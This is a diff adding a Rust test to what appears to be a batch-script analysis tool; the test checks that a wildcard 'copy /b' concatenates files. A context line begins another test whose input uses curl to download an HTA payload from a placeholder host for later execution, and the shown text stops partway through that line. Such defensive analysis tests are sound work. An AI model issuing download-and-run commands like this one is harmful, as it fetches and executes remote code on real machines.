@@ -27114,6 +27114,37 @@ mod copy_multi_source_tests {
     }
 
     #[test]
+    fn copy_b_wildcard_source_concat_tracked() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "a.part".to_string(),
+            FsEntry::Content {
+                content: b"alpha".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "b.part".to_string(),
+            FsEntry::Content {
+                content: b"beta".to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line("copy /b *.part out.txt", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get("out.txt")
+            .expect("out.txt missing");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. } if content == b"alphabeta"),
+            "wildcard copy /b did not preserve concatenated content: {:?}",
+            entry
+        );
+    }
+
+    #[test]
     fn copy_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://copy-download.example/payload.hta
